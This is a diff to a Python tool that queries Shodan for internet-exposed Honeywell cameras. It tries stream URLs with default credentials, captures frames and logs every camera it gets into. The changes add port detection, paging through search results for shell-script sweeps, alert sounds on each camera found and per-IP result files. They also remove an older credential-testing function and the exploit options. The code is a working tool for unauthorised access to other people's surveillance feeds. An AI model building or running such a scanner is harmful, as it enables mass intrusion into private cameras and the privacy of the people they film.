@@ -14,14 +14,16 @@ import os
 import sys
 import time
 import argparse
+import json
+import base64
+import re
+import socket
+import threading
+from urllib.parse import urlparse
+
 import shodan
 import requests
 import cv2
-import json
-import base64
-from concurrent.futures import ThreadPoolExecutor, as_completed
-from urllib.parse import urlparse, parse_qs, urlencode
-import re
 
 # List of RTSP URL patterns for Honeywell cameras from references
 HONEYWELL_RTSP_PATTERNS = [
@@ -94,12 +96,9 @@ DEFAULT_CREDENTIALS = [
     {"username": "admin", "password": "12345"}  # Only admin:12345 as requested
 ]
 
-# Path to the CVE database file
-CVE_DATABASE_FILE = "honeywell_cve_database.json"
-
 # Standard HTTP headers to include with requests
 HTTP_HEADERS = {
-    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
     "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
     "Accept-Language": "en-US,en;q=0.5",
     "Connection": "keep-alive"
@@ -107,15 +106,12 @@ HTTP_HEADERS = {
 
 def ensure_dir(directory):
     """Make sure a directory exists, creating it if necessary"""
-    if not os.path.exists(directory):
-        os.makedirs(directory)
+    os.makedirs(directory, exist_ok=True)
 
 def check_rtsp_stream(url, timeout=5, save_frames=False, output_dir=None, max_frames=5):
     """Try to connect to an RTSP stream with a hard timeout using threading"""
     try:
         # Do a quick socket check to see if the port is even open first
-        import socket
-        
         # Parse the URL to get host and port
         parsed_url = urlparse(url)
         hostname = parsed_url.hostname
@@ -128,7 +124,6 @@ def check_rtsp_stream(url, timeout=5, save_frames=False, output_dir=None, max_fr
         try:
             s.connect((hostname, port))
             # Port is open, we can try OpenCV
-            s.close()
         except (socket.timeout, ConnectionRefusedError, socket.error):
             print(f"Connection to {hostname}:{port} failed - port closed or filtered")
             return False
@@ -137,9 +132,6 @@ def check_rtsp_stream(url, timeout=5, save_frames=False, output_dir=None, max_fr
         
         # If we're here, the port is open, so try OpenCV for frames
         # Use a much more strict timeout mechanism
-        import threading
-        import signal
-        
         result = {"success": False, "frames": []}
         
         # Define a function for the thread to run with a timeout
@@ -202,7 +194,7 @@ def check_rtsp_stream(url, timeout=5, save_frames=False, output_dir=None, max_fr
         print(f"Error checking RTSP stream {url}: {str(e)}")
         return False
 
-def check_http_stream(url, timeout=1):
+def check_http_stream(url, timeout=5):
     """Try to connect to an HTTP stream"""
     try:
         response = requests.get(url, timeout=timeout, stream=True, headers=HTTP_HEADERS)
@@ -221,122 +213,11 @@ def encode_basic_auth(username, password):
     auth_string = f"{username}:{password}"
     return base64.b64encode(auth_string.encode('utf-8')).decode('utf-8')
 
-def test_url_with_credentials(base_url, credentials, is_rtsp=True, channel=1, save_frames=False, ip=None):
-    """Test a URL with different credentials"""
-    working_urls = []
-    parsed = urlparse(base_url)
-    
-    # Get the base directory and captures directory paths
-    base_dir = os.path.dirname(os.path.abspath(__file__))
-    captures_dir = os.path.join(base_dir, "captures")
-    
-    for cred in credentials:
-        username = cred["username"]
-        password = cred["password"]
-        
-        # Skip empty credentials if the URL already has auth info
-        if not username and not password and "@" in parsed.netloc:
-            continue
-        
-        # Create URL with credentials
-        auth_string = f"{username}:{password}@" if username or password else ""
-        
-        if is_rtsp:
-            # For RTSP URLs
-            scheme = parsed.scheme
-            netloc = parsed.netloc
-            path = parsed.path
-            query_string = parsed.query
-            
-            # Parse query parameters
-            query_params = parse_qs(query_string)
-            
-            # Remove existing auth if present
-            if "@" in netloc:
-                netloc = netloc.split("@")[1]
-            
-            # Add credentials to netloc
-            netloc = f"{auth_string}{netloc}"
-            
-            # Check if we need to format username/password in the path or query
-            if "{username}" in path or "{password}" in path:
-                path = path.replace("{username}", username).replace("{password}", password)
-            
-            # Check if the auth string needs to be encoded in the query
-            if "authbasic" in query_params:
-                encoded_auth = encode_basic_auth(username, password)
-                query_params["authbasic"] = [encoded_auth]
-                query_string = urlencode(query_params, doseq=True)
-            elif "{username}" in query_string or "{password}" in query_string:
-                query_string = query_string.replace("{username}", username).replace("{password}", password)
-            
-            # Rebuild URL
-            url_with_auth = f"{scheme}://{netloc}{path}"
-            if query_string:
-                url_with_auth += f"?{query_string}"
-            
-            # Format with IP and channel if needed
-            if "{ip}" in url_with_auth:
-                url_with_auth = url_with_auth.format(ip=ip)
-            if "{channel}" in url_with_auth:
-                url_with_auth = url_with_auth.format(channel=channel)
-                
-            print(f"Testing {url_with_auth}...")
-            
-            # Create output directory for frames if needed
-            output_dir = None
-            if save_frames and ip:
-                # Create a clean string for the URL (removing invalid filename chars)
-                url_string = url_with_auth.replace(":", "_").replace("/", "_").replace("\\", "_")
-                url_string = ''.join(c for c in url_string if c.isalnum() or c in '_-.')
-                output_dir = os.path.join(captures_dir, ip, url_string)
-                
-            if check_rtsp_stream(url_with_auth, save_frames=save_frames, output_dir=output_dir):
-                cred_info = f" [Credentials: {username}:{password}]" if username or password else ""
-                working_urls.append(f"[SUCCESS] {url_with_auth}{cred_info}")
-            else:
-                cred_info = f" [Credentials: {username}:{password}]" if username or password else ""
-                working_urls.append(f"[FAILED] {url_with_auth}{cred_info}")
-        else:
-            # For HTTP URLs
-            scheme = parsed.scheme
-            netloc = parsed.netloc
-            path = parsed.path
-            query_string = parsed.query
-            
-            # Remove existing auth if present
-            if "@" in netloc:
-                netloc = netloc.split("@")[1]
-            
-            # Add credentials
-            netloc = f"{auth_string}{netloc}"
-            
-            # Rebuild URL
-            url_with_auth = f"{scheme}://{netloc}{path}"
-            if query_string:
-                url_with_auth += f"?{query_string}"
-            
-            # Format with IP and channel if needed
-            if "{ip}" in url_with_auth:
-                url_with_auth = url_with_auth.format(ip=ip)
-            if "{channel}" in url_with_auth:
-                url_with_auth = url_with_auth.format(channel=channel)
-                
-            print(f"Testing {url_with_auth}...")
-            
-            if check_http_stream(url_with_auth):
-                cred_info = f" [Credentials: {username}:{password}]" if username or password else ""
-                working_urls.append(f"[SUCCESS] {url_with_auth}{cred_info}")
-            else:
-                cred_info = f" [Credentials: {username}:{password}]" if username or password else ""
-                working_urls.append(f"[FAILED] {url_with_auth}{cred_info}")
-    
-    return working_urls
-
 def detect_camera_ports(camera_data):
     """
-    Analyze Shodan data to detect the appropriate ports for HTTP and RTSP
-    Returns a dictionary with rtsp_port and http_port
+    Analyze Shodan data to detect the appropriate ports for HTTP and RTSP.
+    Handles both single search match results and host-level data structures.
+    Returns a dictionary with rtsp_port and http_port.
     """
     ports = {
         "rtsp_port": 554,  # Default RTSP port
@@ -346,42 +227,59 @@ def detect_camera_ports(camera_data):
     if not camera_data or not isinstance(camera_data, dict):
         return ports
     
-    # Get all ports from the Shodan data
+    # Get the raw Shodan match data (stored under 'data' key by search_shodan)
+    match = camera_data.get('data')
+    
+    # Handle single Shodan search match (dict with 'port', '_shodan', etc.)
+    if isinstance(match, dict):
+        match_port = match.get('port')
+        module = match.get('_shodan', {}).get('module', '')
+        banner = str(match.get('data', '')).lower()
+        
+        if match_port:
+            if module == 'rtsp' or 'rtsp' in banner or match_port in COMMON_RTSP_PORTS:
+                ports['rtsp_port'] = match_port
+                print(f"Detected RTSP port from Shodan match: {match_port}")
+            elif module in ('http', 'https') or 'http' in banner or match_port in COMMON_HTTP_PORTS:
+                ports['http_port'] = match_port
+                print(f"Detected HTTP port from Shodan match: {match_port}")
+    
+    # Handle host-level data (list of service entries from api.host())
+    elif isinstance(match, list):
+        for data_item in match:
+            if not isinstance(data_item, dict):
+                continue
+            item_port = data_item.get('port')
+            if not item_port:
+                continue
+            
+            item_module = data_item.get('_shodan', {}).get('module', '')
+            item_banner = str(data_item.get('data', '')).lower()
+            
+            if item_module == 'rtsp' or 'rtsp' in item_banner or item_port in COMMON_RTSP_PORTS:
+                ports['rtsp_port'] = item_port
+                print(f"Detected likely RTSP port: {item_port}")
+            elif (item_module in ('http', 'https') or 'http' in item_banner
+                  or item_port in COMMON_HTTP_PORTS):
+                ports['http_port'] = item_port
+                print(f"Detected likely HTTP port: {item_port}")
+    
+    # Fallback: check the available port list from the camera dict
     all_ports = camera_data.get('ports', [])
-    
-    # Parse available data for service information
-    for data_item in camera_data.get('data', []):
-        port = data_item.get('port')
-        if not port:
-            continue
+    if isinstance(all_ports, list):
+        if ports["rtsp_port"] == 554:
+            for port in all_ports:
+                if port in COMMON_RTSP_PORTS:
+                    ports["rtsp_port"] = port
+                    print(f"Using common RTSP port found in available ports: {port}")
+                    break
         
-        # Check for RTSP service
-        if 'rtsp' in str(data_item.get('data', '')).lower() or port in COMMON_RTSP_PORTS:
-            ports['rtsp_port'] = port
-            print(f"Detected likely RTSP port: {port}")
-        
-        # Check for HTTP/Web service
-        elif ('http' in str(data_item.get('data', '')).lower() or 
-              port in COMMON_HTTP_PORTS or
-              data_item.get('_shodan', {}).get('module') == 'http' or
-              data_item.get('_shodan', {}).get('module') == 'https'):
-            ports['http_port'] = port
-            print(f"Detected likely HTTP port: {port}")
-    
-    # If we couldn't find specific ports, check the available port list
-    if ports["rtsp_port"] == 554 and all_ports:
-        for port in all_ports:
-            if port in COMMON_RTSP_PORTS:
-                ports["rtsp_port"] = port
-                print(f"Using common RTSP port found in available ports: {port}")
-                break
-    
-    if ports["http_port"] == 80 and all_ports:
-        for port in all_ports:
-            if port in COMMON_HTTP_PORTS:
-                ports["http_port"] = port
-                print(f"Using common HTTP port found in available ports: {port}")
-                break
+        if ports["http_port"] == 80:
+            for port in all_ports:
+                if port in COMMON_HTTP_PORTS:
+                    ports["http_port"] = port
+                    print(f"Using common HTTP port found in available ports: {port}")
+                    break
     
     return ports
 
@@ -392,9 +290,13 @@ def test_camera_urls(ip, channel, credentials, save_frames=False, rtsp_port=None
     # Build URL patterns to test with credentials and channel info
     patterns = []
     
+    # Determine the RTSP and HTTP ports to use for pattern formatting
+    fmt_rtsp_port = rtsp_port if rtsp_port else 554
+    fmt_http_port = http_port if http_port else 80
+
     # Include hardcoded auth patterns exactly as they are
     for pattern in HARDCODED_AUTH_PATTERNS:
-        patterns.append(pattern.format(ip=ip, channel=channel))
+        patterns.append(pattern.format(ip=ip, channel=channel, rtsp_port=fmt_rtsp_port))
     
     # Add RTSP patterns for each credential
     for cred in credentials:
@@ -403,7 +305,7 @@ def test_camera_urls(ip, channel, credentials, save_frames=False, rtsp_port=None
         
         # Test basic patterns with credentials if needed
         for pattern in HONEYWELL_RTSP_PATTERNS:
-            auth_url = pattern.format(ip=ip, channel=channel)
+            auth_url = pattern.format(ip=ip, channel=channel, rtsp_port=fmt_rtsp_port)
             # Add authenticated URL if pattern doesn't already include auth
             if "user=" not in pattern and "password=" not in pattern and "authbasic=" not in pattern:
                 auth_url = auth_url.replace("rtsp://", f"rtsp://{username}:{password}@")
@@ -411,7 +313,7 @@ def test_camera_urls(ip, channel, credentials, save_frames=False, rtsp_port=None
         
         # Add patterns requiring auth
         for pattern in AUTH_REQUIRING_PATTERNS:
-            auth_pattern = pattern.format(ip=ip, channel=channel)
+            auth_pattern = pattern.format(ip=ip, channel=channel, rtsp_port=fmt_rtsp_port)
             # Add authentication
             encoded_auth = encode_basic_auth(username, password)
             auth_pattern = auth_pattern + f"&authbasic={encoded_auth}"
@@ -428,7 +330,7 @@ def test_camera_urls(ip, channel, credentials, save_frames=False, rtsp_port=None
     # Add HTTP URL patterns
     http_patterns = []
     for pattern in HONEYWELL_HTTP_PATTERNS:
-        http_patterns.append(pattern.format(ip=ip, channel=channel))
+        http_patterns.append(pattern.format(ip=ip, channel=channel, http_port=fmt_http_port))
     
     # Add port variations if auto_detect is enabled
     if auto_detect:
@@ -466,9 +368,9 @@ def test_camera_urls(ip, channel, credentials, save_frames=False, rtsp_port=None
             success = check_rtsp_stream(url, timeout=timeout, save_frames=save_frames, output_dir=f"captures/{ip}")
             
             if success:
-                results.append(f"✅ Working URL: {url}")
+                results.append(f"[OK] Working URL: {url}")
             else:
-                results.append(f"❌ Failed: {url}")
+                results.append(f"[FAIL] Failed: {url}")
     
     # Test HTTP URLs with different ports
     for port in http_ports:
@@ -489,9 +391,9 @@ def test_camera_urls(ip, channel, credentials, save_frames=False, rtsp_port=None
             success = check_http_stream(url, timeout=timeout)
             
             if success:
-                results.append(f"✅ Working URL: {url}")
+                results.append(f"[OK] Working URL: {url}")
             else:
-                results.append(f"❌ Failed: {url}")
+                results.append(f"[FAIL] Failed: {url}")
     
     return results
 
@@ -672,7 +574,7 @@ def play_notification_sound():
         
         # Additional sound using print with special character - works on most terminals
         print("\n\007\007\007")  # \007 is the ASCII bell character
-        print("\n🔔 CAMERA FOUND! 🔔\n")
+        print("\n** CAMERA FOUND! **\n")
     except Exception as e:
         print(f"Could not play notification sound: {str(e)}")
 
@@ -687,6 +589,7 @@ def main():
     parser.add_argument('--output-list', '-o', help='Save list of working cameras to this file (default: working_cameras.txt)')
     parser.add_argument('--timeout', '-t', type=int, default=5, help='Timeout in seconds for connection attempts (default: 5)')
     parser.add_argument('--query', '-q', help='Custom Shodan search query')
+    parser.add_argument('--page', type=int, default=1, help='Shodan results page number (default: 1)')
     parser.add_argument('--enum-channels', '-e', action='store_true', help='Try to enumerate camera channels (default: False)')
     parser.add_argument('--result-file', help='Save results to this file (default: camera_results_[IP].txt)')
     parser.add_argument('--until-success', action='store_true', help='Stop after finding first working camera')
@@ -694,9 +597,6 @@ def main():
     parser.add_argument('--http-port', type=int, help='Custom HTTP port to use')
     parser.add_argument('--auto-detect-ports', action='store_true', help='Automatically detect ports (default)')
     parser.add_argument('--notify', action='store_true', help='Play notification sound when camera found')
-    parser.add_argument('--verbose', action='store_true', help='Show detailed information')
-    parser.add_argument('--check-vulns', action='store_true', help='Check for known vulnerabilities')
-    parser.add_argument('--exploit', help='Run exploit for specific CVE')
     
     args = parser.parse_args()
     
@@ -708,11 +608,6 @@ def main():
     # Ensure the directories exist
     ensure_dir(logs_dir)
     ensure_dir(captures_dir)
-    
-    # Set global timeout
-    global check_rtsp_stream, check_http_stream
-    check_rtsp_stream.__defaults__ = (args.timeout, False, None, 5)
-    check_http_stream.__defaults__ = (args.timeout,)
     
     # Load credentials if specified
     credentials = DEFAULT_CREDENTIALS
@@ -763,10 +658,14 @@ def main():
             all_results.extend(results)
             
             # Check if any URL works for this camera
-            if any("✅" in result for result in results):
+            if any("[OK]" in result for result in results):
                 if args.ip not in working_ips:
                     working_ips.append(args.ip)
                 
+                # Play notification sound if enabled
+                if args.notify:
+                    play_notification_sound()
+
                 # If --until-success flag is set, break after finding first working camera
                 if args.until_success:
                     break
@@ -785,7 +684,7 @@ def main():
         # Ensure logs directory exists
         ensure_dir(os.path.dirname(result_filename))
         
-        with open(result_filename, 'w') as f:
+        with open(result_filename, 'w', encoding='utf-8') as f:
             # Write camera name/channel info
             f.write(f"Camera: {args.ip}\n")
             f.write(f"Camera Name: {camera_info.get('camera_name', 'Unknown')}\n")
@@ -806,11 +705,16 @@ def main():
             
         product_type = "custom cameras" if args.query else "Honeywell cameras"
         print(f"Searching Shodan for {product_type}...")
-        cameras = search_shodan(args.api_key, args.limit, args.query)
+        cameras = search_shodan(args.api_key, args.limit, args.query, args.page)
         
         if not cameras:
             print("No matching cameras found")
-            return
+            # Clear working_cameras.txt so stale data from previous runs doesn't persist
+            working_cameras_path = args.output_list if args.output_list else os.path.join(logs_dir, "working_cameras.txt")
+            ensure_dir(os.path.dirname(os.path.abspath(working_cameras_path)))
+            with open(working_cameras_path, 'w', encoding='utf-8') as f:
+                pass  # Write empty file
+            sys.exit(2)  # Exit code 2 signals "no results" to shell scripts for pagination
         
         print(f"Found {len(cameras)} matching cameras")
         
@@ -831,21 +735,75 @@ def main():
                     channels_to_test = camera_info["available_channels"]
                     print(f"Will test the following channels: {channels_to_test}")
             
+            # Detect ports from Shodan data
+            detected_ports = detect_camera_ports(camera)
+            cam_rtsp_port = args.rtsp_port if args.rtsp_port else detected_ports.get('rtsp_port')
+            cam_http_port = args.http_port if args.http_port else detected_ports.get('http_port')
+
             all_results = []
             for channel in channels_to_test:
                 print(f"\nTesting channel {channel}...")
                 results = test_camera_urls(ip, channel, credentials, args.save_frames,
+                                         rtsp_port=cam_rtsp_port, http_port=cam_http_port,
+                                         auto_detect=args.auto_detect_ports,
                                          timeout=args.timeout)
                 all_results.extend(results)
                 
                 # Check if any URL works for this camera
-                if any("✅" in result for result in results):
+                if any("[OK]" in result for result in results):
                     if ip not in working_ips:
                         working_ips.append(ip)
                     
+                    # Play notification sound if enabled
+                    if args.notify:
+                        play_notification_sound()
+
                     # If --until-success flag is set, break after finding first working camera
                     if args.until_success:
                         break
+            
+            # Save per-IP results file
+            ip_result_filename = os.path.join(logs_dir, f"camera_results_{ip}.txt")
+            with open(ip_result_filename, 'w', encoding='utf-8') as f:
+                f.write(f"Camera: {ip}\n")
+                f.write(f"Org: {org}\n")
+                f.write(f"Ports: {ports}\n")
+                f.write(f"Camera Name: {camera_info.get('camera_name', 'Unknown')}\n")
+                f.write(f"Available Channels: {camera_info.get('available_channels', channels_to_test)}\n\n")
+                for result in all_results:
+                    f.write(f"{result}\n")
+                    print(result)
+            
+            # If --until-success and we found a working camera, stop scanning
+            if args.until_success and ip in working_ips:
+                print(f"\n--until-success: Found working camera at {ip}, stopping scan.")
+                break
+
+        # Save results to the specified result file if provided
+        if args.result_file:
+            with open(args.result_file, 'a', encoding='utf-8') as f:
+                f.write(f"\nShodan scan complete. Tested {len(cameras)} cameras.\n")
+                f.write(f"Working cameras: {len(working_ips)}\n")
+                for ip in working_ips:
+                    f.write(f"  {ip}\n")
+
+    # Write working_cameras.txt (used by shell scripts for summary)
+    working_cameras_path = args.output_list if args.output_list else os.path.join(logs_dir, "working_cameras.txt")
+    # Ensure parent directory exists
+    ensure_dir(os.path.dirname(os.path.abspath(working_cameras_path)))
+    with open(working_cameras_path, 'w', encoding='utf-8') as f:
+        for ip in working_ips:
+            f.write(f"{ip}\n")
+    
+    if working_ips:
+        print(f"\n{'='*40}")
+        print(f"Found {len(working_ips)} working camera(s):")
+        print(f"{'='*40}")
+        for ip in working_ips:
+            print(f"  {ip}")
+        print(f"\nWorking cameras saved to: {working_cameras_path}")
+    else:
+        print("\nNo working cameras found.")
 
 if __name__ == "__main__":
     main() 
